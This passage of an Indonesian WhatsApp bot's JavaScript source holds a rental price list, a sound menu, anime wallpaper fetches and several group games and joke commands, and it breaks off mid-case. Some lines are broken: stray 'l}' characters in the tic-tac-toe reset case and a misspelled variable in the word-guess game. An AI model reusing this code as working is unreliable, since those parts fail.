┃💌 : SEWA PERMANEN 25K
┗━━⬣

┏━━⬣ 𝐏𝐫𝐢𝐜𝐞 𝐋𝐢𝐬𝐭 𝐓𝐰𝐨🎋
┃💌 : JADI BOT 30K/BLN
┃💌 : JADI BOT + OWNER 35K
┃💌 : BUAT BELI APIKEY! 
┃💌 : BIAR WORK ALL
┗━━⬣

┏━━⬣ 𝐌𝐢𝐧𝐚𝐭?𝐂𝐡𝐚𝐭♨️
┃💌 : SERING² DONASI✨
┃💌 : ==============
┃💌 : wa.me/628887816980
┃💌 : ==============
┃💌 : Instagram : @ricxyz13
┃💌 : YouTube : NoxyBotz
┗━━⬣`
memey =`٬࿊⃟☃ MAKASIH KAK YANG UDAH SEWABOT SEMOGA LANCAR REZEKINYA JANGAN LUPA DONASI KAK ☕`
but = [
{ buttonId: `${prefix}owner`, buttonText: { displayText: 'OWNER'}, type: 1 },
{ buttonId: `${prefix}payment`, buttonText: { displayText: 'PAYMENT'}, type: 1 },
{ buttonId: `${prefix}buypremium`, buttonText: { displayText: 'BUY PREMIUM'}, type: 1 }
]
await gans.sendMessage(m.chat, { caption: `${swenya}`, location: { jpegThumbnail: await reSize(faall, 300, 200)}, buttons: but, footer: memey, quoted: ftroli})
}
break

//Sound Menu Ygy
case 'soundmenu': case 'menusound': {
let ownernya = ownernomer + '@s.whatsapp.net'
let me = m.sender
let ments = [ownernya, me, ini_mark]
let kukiw = `*Kak ${pushname} ${ucapanWaktu} Semoga Harimu Menyenangkan*`
let sections = [
    {
	           title: "⚠︎  ∫ » Pilih Sound Dibawah Kak « ✧",
    rows: [
    {title: "✦  「 Sound 1 」", rowId: `.sound1`},
    {title: "✦  「 Sound 2 」", rowId: `sound2`},
    {title: "✦  「 Sound 3 」", rowId: `sound3`},
    {title: "✦  「 Sound 4 」", rowId: `sound4`},
    {title: "✦  「 Sound 5 」", rowId: `sound5`},
    {title: "✦  「 Sound 6 」", rowId: `sound6`},
    {title: "✦  「 Sound 7 」", rowId: `sound7`},
    {title: "✦  「 Sound 8 」", rowId: `sound8`},
    {title: "✦  「 Sound 9 」", rowId: `sound9`},
    {title: "✦  「 Sound 10 」", rowId: `sound10`},
    {title: "✦  「 Sound 11 」", rowId: `sound11`},
    {title: "✦  「 Sound 12 」", rowId: `sound12`},
    {title: "✦  「 Sound 13 」", rowId: `sound13`},
    {title: "✦  「 Sound 14 」", rowId: `sound14`},
    {title: "✦  「 Sound 15 」", rowId: `sound15`},
    {title: "✦  「 Sound 16 」", rowId: `sound16`},
    {title: "✦  「 Sound 17 」", rowId: `.sound17`},
    {title: "✦  「 Sound 18 」", rowId: `sound18`},
    {title: "✦  「 Sound 19 」", rowId: `sound19`},
    {title: "✦  「 Sound 20 」", rowId: `sound20`},
    {title: "✦  「 Sound 21 」", rowId: `sound21`},
    {title: "✦  「 Sound 22 」", rowId: `sound22`},
    {title: "✦  「 Sound 23 」", rowId: `sound23`},
    {title: "✦  「 Sound 24 」", rowId: `sound24`},
    {title: "✦  「 Sound 25 」", rowId: `sound25`},
    {title: "✦  「 Sound 26 」", rowId: `sound26`},
    {title: "✦  「 Sound 27 」", rowId: `sound27`},
    {title: "✦  「 Sound 28 」", rowId: `sound28`},
    {title: "✦  「 Sound 29 」", rowId: `sound29`},
    {title: "✦  「 Sound 30 」", rowId: `sound30`},
    {title: "✦  「 Sound 31 」", rowId: `sound31`},
    {title: "✦  「 Sound 32 」", rowId: `sound32`},
    {title: "✦  「 Sound 33 」", rowId: `sound33`},
    {title: "✦  「 Sound 34  」", rowId: ".sound34"},
	{title: "✦  「 Sound 35  」", rowId: ".sound35"},
	{title: "✦  「 Sound 36  」", rowId: ".sound36"},
	{title: "✦  「 Sound 37  」", rowId: ".sound37"},
	{title: "✦  「 Sound 38  」", rowId: ".sound38"},
	{title: "✦  「 Sound 39  」", rowId: ".sound39"},
    {title: "✦  「 Sound 40  」", rowId: ".sound40"},
	{title: "✦  「 Sound 41  」", rowId: ".sound41"},
    {title: "✦  「 Sound 42  」", rowId: ".sound42"},
	{title: "✦  「 Sound 43  」", rowId: ".sound43"},
	{title: "✦  「 Sound 44  」", rowId: ".sound44"},
	{title: "✦  「 Sound 45  」", rowId: ".sound45"},
	{title: "✦  「 Sound 46  」", rowId: ".sound46"},
	{title: "✦  「 Sound 47  」", rowId: ".sound47"},
	{title: "✦  「 Sound 48  」", rowId: ".sound48"},
	{title: "✦  「 Sound 49  」", rowId: ".sound49"},
	{title: "✦  「 Sound 50  」", rowId: ".sound50"},
	{title: "✦  「 Sound 51  」", rowId: ".sound51"},
	{title: "✦  「 Sound 52  」", rowId: ".sound52"},
	{title: "✦  「 Sound 53  」", rowId: ".sound53"},
	{title: "✦  「 Sound 54  」", rowId: ".sound54"},
	{title: "✦  「 Sound 55  」", rowId: ".sound55"},
	{title: "✦  「 Sound 56  」", rowId: ".sound56"},
	{title: "✦  「 Sound 57  」", rowId: ".sound57"},
	{title: "✦  「 Sound 58  」", rowId: ".sound58"},
	{title: "✦  「 Sound 59  」", rowId: ".sound59"},
    {title: "✦  「 Sound 60  」", rowId: ".sound60"},
	{title: "✦  「 Sound 61  」", rowId: ".sound61"},
    {title: "✦  「 Sound 62  」", rowId: ".sound62"},
	{title: "✦  「 Sound 63  」", rowId: ".sound63"},
	{title: "✦  「 Sound 64  」", rowId: ".sound64"},
	{title: "✦  「 Sound 65  」", rowId: ".sound65"},
	{title: "✦  「 Sound 66  」", rowId: ".sound66"},
	{title: "✦  「 Sound 67  」", rowId: ".sound67"},
	{title: "✦  「 Sound 68  」", rowId: ".sound68"},
	{title: "✦  「 Sound 69  」", rowId: ".sound69"},
	{title: "✦  「 Sound 70  」", rowId: ".sound70"},
	{title: "✦  「 Sound 71  」", rowId: ".sound71"},
	{title: "✦  「 Sound 72  」", rowId: ".sound72"},
	{title: "✦  「 Sound 73  」", rowId: ".sound73"},
	{title: "✦  「 Sound 74  」", rowId: ".sound74"},
	{title: "✦  「 Sound 75  」", rowId: ".sound75"},
	{title: "✦  「 Sound 76  」", rowId: ".sound76"},
	{title: "✦  「 Sound 77  」", rowId: ".sound77"},
	{title: "✦  「 Sound 78  」", rowId: ".sound78"},
	{title: "✦  「 Sound 79  」", rowId: ".sound79"},
    {title: "✦  「 Sound 80  」", rowId: ".sound80"},
	{title: "✦  「 Sound 81  」", rowId: ".sound81"},
    {title: "✦  「 Sound 82  」", rowId: ".sound82"},
	{title: "✦  「 Sound 83  」", rowId: ".sound83"},
	{title: "✦  「 Sound 84  」", rowId: ".sound84"},
	{title: "✦  「 Sound 85  」", rowId: ".sound85"},
	{title: "✦  「 Sound 86  」", rowId: ".sound86"},
	{title: "✦  「 Sound 87  」", rowId: ".sound87"},
	{title: "✦  「 Sound 88  」", rowId: ".sound88"},
	{title: "✦  「 Sound 89  」", rowId: ".sound89"},
	{title: "✦  「 Sound 90  」", rowId: ".sound90"},
	{title: "✦  「 Sound 91  」", rowId: ".sound91"},
	{title: "✦  「 Sound 92  」", rowId: ".sound92"},
	{title: "✦  「 Sound 93  」", rowId: ".sound93"},
	{title: "✦  「 Sound 94  」", rowId: ".sound94"},
	{title: "✦  「 Sound 95  」", rowId: ".sound95"},
	{title: "✦  「 Sound 96  」", rowId: ".sound96"},
	{title: "✦  「 Sound 97  」", rowId: ".sound97"},
	{title: "✦  「 Sound 98  」", rowId: ".sound98"},
	{title: "✦  「 Sound 99  」", rowId: ".sound99"},
    {title: "✦  「 Sound 100  」", rowId: ".sound100"},
	{title: "✦  「 Sound 101  」", rowId: ".sound101"},
    {title: "✦  「 Sound 102  」", rowId: ".sound102"},
	{title: "✦  「 Sound 103  」", rowId: ".sound103"},
	{title: "✦  「 Sound 104  」", rowId: ".sound104"},
	{title: "✦  「 Sound 105  」", rowId: ".sound105"},
	{title: "✦  「 Sound 106  」", rowId: ".sound106"},
	{title: "✦  「 Sound 107  」", rowId: ".sound107"},
	{title: "✦  「 Sound 108  」", rowId: ".sound108"},
	{title: "✦  「 Sound 109  」", rowId: ".sound109"},
	{title: "✦  「 Sound 110  」", rowId: ".sound110"},
	{title: "✦  「 Sound 111  」", rowId: ".sound111"},
	{title: "✦  「 Sound 112  」", rowId: ".sound112"},
	{title: "✦  「 Sound 113  」", rowId: ".sound113"},
	{title: "✦  「 Sound 114  」", rowId: ".sound114"},
	{title: "✦  「 Sound 115  」", rowId: ".sound115"},
	{title: "✦  「 Sound 116  」", rowId: ".sound116"},
	{title: "✦  「 Sound 117  」", rowId: ".sound117"},
	{title: "✦  「 Sound 118  」", rowId: ".sound118"},
	{title: "✦  「 Sound 119  」", rowId: ".sound119"}
    ]
    },{
title: ' ∫ » SUPPORT ME –––––––·•',
rows: [
{title: "🎟 • Donasi", rowId: `donasi`},
{title: "🔴 • Subscribe", rowId: `subsyt`},
{title: "📚 • Github", rowId: `sc`}
	]
  },
]
gans.sendListMsg(m.chat, kukiw, nyoutube, `*${ucapanWaktu}*`, `Touch Me (⁠≧⁠▽⁠≦⁠)`, sections, ftroli)
            }
            break
case 'sound1':
case 'sound2':
case 'sound3':
case 'sound4':
case 'sound5':
case 'sound6':
case 'sound7':
case 'sound8':
case 'sound9':
case 'sound10':
case 'sound11':
case 'sound12':
case 'sound13':
case 'sound14':
case 'sound15':
case 'sound16':
case 'sound17':
case 'sound18':
case 'sound19':
case 'sound20':
case 'sound21':
case 'sound22':
case 'sound23':
case 'sound24':
case 'sound25':
case 'sound26':
case 'sound27':
case 'sound28':
case 'sound29':
case 'sound30':
case 'sound31':
case 'sound32':
case 'sound33':
case 'sound34':
case 'sound35':
case 'sound36':
case 'sound37':
case 'sound38':
case 'sound39':
case 'sound40':
case 'sound41':
case 'sound42':
case 'sound43':
case 'sound44':
case 'sound45':
case 'sound46':
case 'sound47':
case 'sound48':
case 'sound49':
case 'sound50':
case 'sound51':
case 'sound52':
case 'sound53':
case 'sound54':
case 'sound55':
case 'sound56':
case 'sound57':
case 'sound58':
case 'sound59':
case 'sound60':
case 'sound61':
case 'sound62':
case 'sound63':
case 'sound64':
case 'sound65':
case 'sound66':
case 'sound67':
case 'sound68':
case 'sound69':
case 'sound70':
case 'sound71':
case 'sound72':
case 'sound73':
case 'sound74':
case 'sound75':
case 'sound76':
case 'sound77':
case 'sound78':
case 'sound79':
case 'sound80':
case 'sound81':
case 'sound82':
case 'sound83':
case 'sound84':
case 'sound85':
case 'sound86':
case 'sound87':
case 'sound88':
case 'sound89':
case 'sound90':
case 'sound91':
case 'sound92':
case 'sound93':
case 'sound94':
case 'sound95':
case 'sound96':
case 'sound97':
case 'sound98':
case 'sound99':
case 'sound100':
case 'sound101':
case 'sound102':
case 'sound103':
case 'sound104':
case 'sound105':
case 'sound106':
case 'sound107':
case 'sound108':
case 'sound109':
case 'sound110':
case 'sound111':
case 'sound112':
case 'sound113':
case 'sound114':
case 'sound115':
case 'sound116':
case 'sound117':
case 'sound118':
case 'sound119':
case 'sound120':
case 'sound121':
case 'sound122':
case 'sound123':
case 'sound124':
case 'sound125':
case 'sound126':
case 'sound127':
case 'sound128':
case 'sound129':
case 'sound130':
case 'sound131':
case 'sound132':
case 'sound133':
case 'sound134':
case 'sound135':
case 'sound136':
case 'sound137':
case 'sound138':
case 'sound139':
case 'sound140':
case 'sound141':
case 'sound142':
case 'sound143':
case 'sound144':
case 'sound145':
case 'sound146':
case 'sound147':
case 'sound148':
case 'sound149':
case 'sound150':
case 'sound151':
case 'sound152':
case 'sound153':
case 'sound154':
case 'sound155':
case 'sound156':
case 'sound157':
case 'sound158':
case 'sound159':
case 'sound160':
case 'sound161':
wokwok = await getBuffer(`https://github.com/DGXeon/Tiktokmusic-API/raw/master/tiktokmusic/${command}.mp3`)
await gans.sendMessage(m.chat, { audio: wokwok, mimetype: 'audio/mp4', ptt: true }, { quoted: ftroli })
break

//Anime 
case 'akira': case 'akiyama': case 'asuna': case 'ayuzawa': case 'boruto': case 'chiho': case 'chitoge': case 'deidara': case 'erza': case 'elaina': case 'eba': case 'emilia': case 'hestia': case 'hinata': case 'inori': case 'isuzu': case 'itachi': case 'itori': case 'kaga': case 'kagura': case 'kaori': case 'keneki': case 'kotori': case 'kurumi': case 'madara': case 'mikasa': case 'miku': case 'minato': case 'naruto': case 'nezuko': case 'sagiri': case 'sasuke': case 'sakura': case 'cosplay':
haha = await fetchJson(`https://api-reysekha.herokuapp.com/api/wallpaper/${command}?apikey=APIKEY`)
gans.sendMessage(m.chat, { image: { url: haha }, caption: `${command}` }, { quoted: m })
break

//Fun And Game
case 'ttc': case 'ttt': case 'tictactoe': {
if (!m.isGroup) throw mess.group
let TicTacToe = require("./lib/tictactoe")
this.game = this.game ? this.game : {}
if (Object.values(this.game).find(room => room.id.startsWith('tictactoe') && [room.game.playerX, room.game.playerO].includes(m.sender))) throw 'Kamu masih didalam game'
let room = Object.values(this.game).find(room => room.state === 'WAITING' && (text ? room.name === text : true))
if (room) {
m.reply('Partner ditemukan!')
room.o = m.chat
room.game.playerO = m.sender
room.state = 'PLAYING'
let arr = room.game.render().map(v => {
return {
            X: '❌',
            O: '⭕',
            1: '1️⃣',
            2: '2️⃣',
            3: '3️⃣',
            4: '4️⃣',
            5: '5️⃣',
            6: '6️⃣',
            7: '7️⃣',
            8: '8️⃣',
            9: '9️⃣',
}[v]
})
let str = `Room ID: ${room.id}

${arr.slice(0, 3).join('')}
${arr.slice(3, 6).join('')}
${arr.slice(6).join('')}

Menunggu @${room.game.currentTurn.split('@')[0]}

Ketik *nyerah* untuk menyerah dan mengakui kekalahan`
if (room.x !== room.o) await gans.sendText(room.x, str, m, { mentions: parseMention(str) } )
await gans.sendText(room.o, str, m, { mentions: parseMention(str) } )
            } else {
            room = {
            id: 'tictactoe-' + (+new Date),
            x: m.chat,
            o: '',
game: new TicTacToe(m.sender, 'o'),
state: 'WAITING'
}
if (text) room.name = text
m.reply('Menunggu partner' + (text ? ` mengetik command dibawah ini ${prefix}${command} ${text}` : ''))
this.game[room.id] = room
}
}
break
case 'delttc': case 'delttt': {
this.game = this.game ? this.game : {}
try {
if (this.game) {
delete this.game
gans.sendText(m.chat, `Berhasil delete session TicTacToe`, m)
} else if (!this.game) {
m.reply(`Session TicTacToe🎮 tidak ada`)
l} else throw '?'
l} catch (e) {
m.reply('rusak')
}
}
break
case 'suitpvp': case 'suit': {
this.suit = this.suit ? this.suit : {}
let poin = 10
let poin_lose = 10
let timeout = 60000
if (Object.values(this.suit).find(roof => roof.id.startsWith('suit') && [roof.p, roof.p2].includes(m.sender))) m.reply(`Selesaikan suit mu yang sebelumnya`)
if (m.mentionedJid[0] === m.sender) return m.reply(`Tidak bisa bermain dengan diri sendiri !`)
if (!m.mentionedJid[0]) return m.reply(`_Siapa yang ingin kamu tantang?_\nTag orangnya..\n\nContoh : ${prefix}suit @${owner[1]}`, m.chat, { mentions: [owner[1] + '@s.whatsapp.net'] })
if (Object.values(this.suit).find(roof => roof.id.startsWith('suit') && [roof.p, roof.p2].includes(m.mentionedJid[0]))) throw `Orang yang kamu tantang sedang bermain suit bersama orang lain :(`
let id = 'suit_' + new Date() * 1
let caption = `_*SUIT PvP*_

@${m.sender.split`@`[0]} *menantang* @${m.mentionedJid[0].split`@`[0]} *untuk bermain suit*

*Silahkan* @${m.mentionedJid[0].split`@`[0]} *untuk ketik terima/tolak*`
this.suit[id] = {
chat: await gans.sendButtonText(m.chat, [{ buttonId: 'terima', buttonText: { displayText: 'Terima' }, type: 1 }, { buttonId: 'tolak', buttonText: { displayText: 'Tolak' }, type: 1 }], caption, gans.user.name, m, { mentions: parseMention(caption) }),
id: id,
p: m.sender,
p2: m.mentionedJid[0],
status: 'wait',
waktu: setTimeout(() => {
if (this.suit[id]) gans.sendText(m.chat, `_Waktu suit habis_`, m)
delete this.suit[id]
}, 60000), poin, poin_lose, timeout
}
}
break
case 'halah': case 'hilih': case 'huluh': case 'heleh': case 'holoh':
if (!m.quoted && !text) throw `Kirim/reply text dengan caption ${prefix + command}`
ter = command[1].toLowerCase()
tex = m.quoted ? m.quoted.text ? m.quoted.text : q ? q : m.text : q ? q : m.text
m.reply(tex.replace(/[aiueo]/g, ter).replace(/[AIUEO]/g, ter.toUpperCase()))
break
case 'family100': {
if ('family100'+m.chat in _family100) {
m.reply('Masih Ada Sesi Yang Belum Diselesaikan!')
throw false
}
let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/family100.json')
let random = anu[Math.floor(Math.random() * anu.length)]
let hasil = `*Jawablah Pertanyaan Berikut :*\n${random.soal}\n\nTerdapat *${random.jawaban.length}* Jawaban ${random.jawaban.find(v => v.includes(' ')) ? `(beberapa Jawaban Terdapat Spasi)` : ''}`.trim()
_family100['family100'+m.chat] = {
id: 'family100'+m.chat,
pesan: await gans.sendText(m.chat, hasil, m),
...random,
terjawab: Array.from(random.jawaban, () => false),
hadiah: 6,
 }
}
break
case 'slot': {
const somtoy = sotoy[Math.floor(Math.random() * sotoy.length)]
let sloth =`[  🎰VIRTUAL SLOT 🎰  ]\n------------------------\n\n🍒 : 🍌 : 🍇\n${somtoy}<=====\n🍇 : 🍌 : 🍒\n\n------------------------\n[  🎰 VIRTUAL SLOT 🎰  ]\n\n*Keterangan* :\n_Jika Mendapatkan 3Buah Sama_\n_Berarti Kamu Win_\n\n_Contoh : 🍒 : 🍒 : 🍒_ <=====`
let buttons = [{ buttonId: 'slot', buttonText: { displayText: '🎰MAIN LAGI🎰' }, type: 1 }]
await gans.sendButtonText(m.chat, buttons, sloth, nyoutube, m)
}
break
case 'tebak': {
let ownernya = ownernomer + '@s.whatsapp.net'
let me = m.sender
let ments = [ownernya, me, ini_mark]
let kukiw = `*Kak ${pushname} ${ucapanWaktu} Semoga Harimu Menyenangkan*`
let sections = [
    {
	           title: "⚠︎  ∫ » Pilih game Yang Ingin Dimainkan « ✧",
    rows: [
    {title: "✦ Tebak Gambar", rowId: `.tebak gambar`},
    {title: "✦ Tebak Kalimat", rowId: `tebak kalimat`},
    {title: "✦ Tebak Lagu", rowId: `tebak lagu`},
    {title: "✦ Tebak Lirik", rowId: `tebak lirik`},
    {title: "✦ Tebak Kata", rowId: `tebak kata`},
    {title: "✦ Cak Lontong", rowId: `tebak lontong`}
    ]
    },{
title: ' ∫ » SUPPORT ME –––––––·•',
rows: [
{title: "🎟 • Donasi", rowId: `donasi`},
{title: "🔴 • Subscribe", rowId: `subsyt`},
{title: "📚 • Github", rowId: `sc`}
]
},
]
gans.sendListMsg(m.chat, kukiw, nyoutube, `*${ucapanWaktu}*`, `Touch Me (⁠≧⁠▽⁠≦⁠)`, sections, ftroli)
if (args[0] === "lagu") {
if (tebaklagu.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
let anu = await fetchJson('https://fatiharridho.github.io/tebaklagu.json')
let result = anu[Math.floor(Math.random() * anu.length)]
let msg = await gans.sendMessage(m.chat, { audio: { url: result.link_song }, mimetype: 'audio/mpeg' }, { quoted: m })
gans.sendText(m.chat, `Lagu Tersebut Adalah Lagu dari?\n\nArtist : ${result.artist}\nWaktu : 60s`, msg).then(() => {
tebaklagu[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
})
await sleep(60000)
if (tebaklagu.hasOwnProperty(m.sender.split('@')[0])) {
console.log("Jawaban: " + result.jawaban)
gans.sendButtonText(m.chat, [{ buttonId: 'tebak lagu', buttonText: { displayText: 'Tebak Lagu' }, type: 1 }], `Waktu Habis\nJawaban:  ${tebaklagu[m.sender.split('@')[0]]}\n\nIngin bermain? tekan button dibawah`, gans.user.name, m)
delete tebaklagu[m.sender.split('@')[0]]
}
} else if (args[0] === 'gambar') {
if (tebakgambar.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakgambar.json')
let result = anu[Math.floor(Math.random() * anu.length)]
gans.sendImage(m.chat, result.img, `Silahkan Jawab Soal Di Atas Ini\n\nDeskripsi : ${result.deskripsi}\nWaktu : 60s`, m).then(() => {
tebakgambar[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
})
await sleep(60000)
if (tebakgambar.hasOwnProperty(m.sender.split('@')[0])) {
console.log("Jawaban: " + result.jawaban)
gans.sendButtonText(m.chat, [{ buttonId: 'tebak gambar', buttonText: { displayText: 'Tebak Gambar' }, type: 1 }], `Waktu Habis\nJawaban:  ${tebakgambar[m.sender.split('@')[0]]}\n\nIngin bermain? tekan button dibawah`, gans.user.name, m)
delete tebakgambar[m.sender.split('@')[0]]
}
} else if (args[0] === 'kata') {
if (tebakkata.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakkata.json')
let result = anu[Math.floor(Math.random() * anu.length)]
gans.sendText(m.chat, `Silahkan Jawab Pertanyaan Berikut\n\n${result.soal}\nWaktu : 60s`, m).then(() => {
ltebakkata[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
})
await sleep(60000)
if (tebakkata.hasOwnProperty(m.sender.split('@')[0])) {
console.log("Jawaban: " + result.jawaban)
gans.sendButtonText(m.chat, [{ buttonId: 'tebak kata', buttonText: { displayText: 'Tebak Kata' }, type: 1 }], `Waktu Habis\nJawaban:  ${tebakkata[m.sender.split('@')[0]]}\n\nIngin bermain? tekan button dibawah`, gans.user.name, m)
delete tebakkata[m.sender.split('@')[0]]
}
} else if (args[0] === 'kalimat') {
if (tebakkalimat.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakkalimat.json')
let result = anu[Math.floor(Math.random() * anu.length)]
gans.sendText(m.chat, `Silahkan Jawab Pertanyaan Berikut\n\n${result.soal}\nWaktu : 60s`, m).then(() => {
tebakkalimat[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
})
await sleep(60000)
if (tebakkalimat.hasOwnProperty(m.sender.split('@')[0])) {
console.log("Jawaban: " + result.jawaban)
gans.sendButtonText(m.chat, [{ buttonId: 'tebak kalimat', buttonText: { displayText: 'Tebak Kalimat' }, type: 1 }], `Waktu Habis\nJawaban:  ${tebakkalimat[m.sender.split('@')[0]]}\n\nIngin bermain? tekan button dibawah`, gans.user.name, m)
delete tebakkalimat[m.sender.split('@')[0]]
}
} else if (args[0] === 'lirik') {
if (tebaklirik.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebaklirik.json')
let result = anu[Math.floor(Math.random() * anu.length)]
gans.sendText(m.chat, `Ini Adalah Lirik Dari Lagu? : *${result.soal}*?\nWaktu : 60s`, m).then(() => {
tebaklirik[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
})
await sleep(60000)
if (tebaklirik.hasOwnProperty(m.sender.split('@')[0])) {
console.log("Jawaban: " + result.jawaban)
gans.sendButtonText(m.chat, [{ buttonId: 'tebak lirik', buttonText: { displayText: 'Tebak Lirik' }, type: 1 }], `Waktu Habis\nJawaban:  ${tebaklirik[m.sender.split('@')[0]]}\n\nIngin bermain? tekan button dibawah`, gans.user.name, m)
delete tebaklirik[m.sender.split('@')[0]]
}
} else if (args[0] === 'lontong') {
if (caklontong.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/caklontong.json')
let result = anu[Math.floor(Math.random() * anu.length)]
gans.sendText(m.chat, `*Jawablah Pertanyaan Berikut :*\n${result.soal}*\nWaktu : 60s`, m).then(() => {
caklontong[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
caklontong_desk[m.sender.split('@')[0]] = result.deskripsi
})
await sleep(60000)
if (caklontong.hasOwnProperty(m.sender.split('@')[0])) {
console.log("Jawaban: " + result.jawaban)
gans.sendButtonText(m.chat, [{ buttonId: 'tebak lontong', buttonText: { displayText: 'Tebak Lontong' }, type: 1 }], `Waktu Habis\nJawaban:  ${caklontong[m.sender.split('@')[0]]}\nDeskripsi : ${caklontong_desk[m.sender.split('@')[0]]}\n\nIngin bermain? tekan button dibawah`, gans.user.name, m)
delete caklontong[m.sender.split('@')[0]]
delete caklontong_desk[m.sender.split('@')[0]]
        }
    }
            }
break
case 'kuismath': case 'math': {
if (kuismath.hasOwnProperty(m.sender.split('@')[0])) throw "Masih Ada Sesi Yang Belum Diselesaikan!"
let { genMath, modes } = require('./src/math')
if (!text) throw `Mode: ${Object.keys(modes).join(' | ')}\nContoh penggunaan: ${prefix}math medium`
let result = await genMath(text.toLowerCase())
gans.sendText(m.chat, `*Berapa hasil dari: ${result.soal.toLowerCase()}*?\n\nWaktu: ${(result.waktu / 1000).toFixed(2)} detik`, m).then(() => {
kuismath[m.sender.split('@')[0]] = result.jawaban
})
await sleep(result.waktu)
if (kuismath.hasOwnProperty(m.sender.split('@')[0])) {
console.log("Jawaban: " + result.jawaban)
m.reply("Waktu Habis\nJawaban: " + kuismath[m.sender.split('@')[0]])
delete kuismath[m.sender.split('@')[0]]
}
}
break

 case 'jodohku': {
if (!m.isGroup) throw mess.group
let member = participants.map(u => u.id)
let me = m.sender
let jodoh = member[Math.floor(Math.random() * member.length)]
let jawab = `👫Jodoh mu adalah

@${me.split('@')[0]} ❤️ @${jodoh.split('@')[0]}`
let ments = [me, jodoh]
let buttons = [
{ buttonId: 'jodohku', buttonText: { displayText: 'Jodohku' }, type: 1 }
]
await gans.sendButtonText(m.chat, buttons, jawab, gans.user.name, m, {mentions: ments})
}
break
case 'jadian': {
if (!m.isGroup) throw mess.group
let member = participants.map(u => u.id)
let orang = member[Math.floor(Math.random() * member.length)]
let jodoh = member[Math.floor(Math.random() * member.length)]
let jawab = `Ciee yang Jadian💖 Jangan lupa Donasi🗿

@${orang.split('@')[0]} ❤️ @${jodoh.split('@')[0]}`
let menst = [orang, jodoh]
let buttons = [
{ buttonId: 'jadian', buttonText: { displayText: 'Jadian' }, type: 1 }
]
await gans.sendButtonText(m.chat, buttons, jawab, nyoutube, m, {mentions: menst})
}
break
case 'gbtku': {
if (!isPremium) throw mess.premime
if (!text) throw `Example : ${prefix + command} hai|halo`
let jawab = `${text.split("|")[0]}`
let buttons = [{ buttonId: 'menu', buttonText: { displayText: `` }, type: 1 }]
await gans.sendButtonText(m.chat, buttons, jawab, `${text.split("|")[1]}`, m, {quoted: ftoko})
}
break
case 'bisakah': {
if (!text) throw `Example : ${prefix + command} saya menang?`
let bisa = ['Bisa','Coba Saja','Pasti Bisa','Mungkin Saja','Tidak Bisa','Tidak Mungkin','Coba Ulangi','Ngimpi kah?','yakin bisa?']
let keh = bisa[Math.floor(Math.random() * bisa.length)]
let jawab = `*Bisakah ${text}*\nJawab : ${keh}`
let buttons = [{ buttonId: 'hehehe', buttonText: { displayText: 'SABAR🗿' }, type: 1 }]
await gans.sendButtonText(m.chat, buttons, jawab, nyoutube, m, {quoted: ftoko})
}
break
case 'apakah': {
if (!text) throw `Example : ${prefix + command} saya bisa menang?`
let apa = ['Iya','Tidak','Bisa Jadi','Coba Ulangi','Mungkin Saja','Coba Tanyakan Ayam']
let kah = apa[Math.floor(Math.random() * apa.length)]
let jawab = `*Apakah ${text}*\nJawab : ${kah}`
let buttons = [{ buttonId: 'hehehe', buttonText: { displayText: 'HAHAHA' }, type: 1 }]
await gans.sendButtonText(m.chat, buttons, jawab, nyoutube, m, {quoted: ftoko})
}
break
case 'kapan': case 'kapankah': {
if (!text) throw `Example : ${prefix + command} saya menang?`
let kapan = ['Besok','Lusa','Nanti','4 Hari Lagi','5 Hari Lagi','6 Hari Lagi','1 Minggu Lagi','2 Minggu Lagi','3 Minggu Lagi','1 Bulan Lagi','2 Bulan Lagi','3 Bulan Lagi','4 Bulan Lagi','5 Bulan Lagi','6 Bulan Lagi','1 Tahun Lagi','2 Tahun Lagi','3 Tahun Lagi','4 Tahun Lagi','5 Tahun Lagi','6 Tahun Lagi','1 Abad lagi','3 Hari Lagi','Bulan Depan','Nanti','Tidak Akan Pernah']
let koh = kapan[Math.floor(Math.random() * kapan.length)]
let jawab = `*${command} ${text}*\nJawab : ${koh}`
let buttons = [{ buttonId: 'hehehe', buttonText: { displayText: 'SABAR🗿' }, type: 1 }]
await gans.sendButtonText(m.chat, buttons, jawab, nyoutube, m, {quoted: ftoko})
}
break
case 'cekmati': {
if (m.text.includes('@')) return m.reply(`Invalid!\n\nPake Nama Woy\nJangan Pakai Tag / Nomer!`)
if (!q) return m.reply(`Invalid!\n\nYg mau di cek siapa anjir?`)
predea = await axios.get(`https://api.agify.io/?name=${q}`)
let jawab = (`Nama : ${predea.data.name}\n*Mati Pada Umur :* ${predea.data.age} Tahun.\n\n_Cepet Cepet Tobat Bro_\n_Soalnya Mati ga ada yang tau_`)
let buttons = [{ buttonId: 'hehehe', buttonText: { displayText: 'SABAR🗿' }, type: 1 }]
await gans.sendButtonText(m.chat, buttons, jawab, nyoutube, m, {mentions: [m.sender], quoted: fkontak})
}
break
case 'mylove': case 'love': case 'cintaku': case 'cinta': {
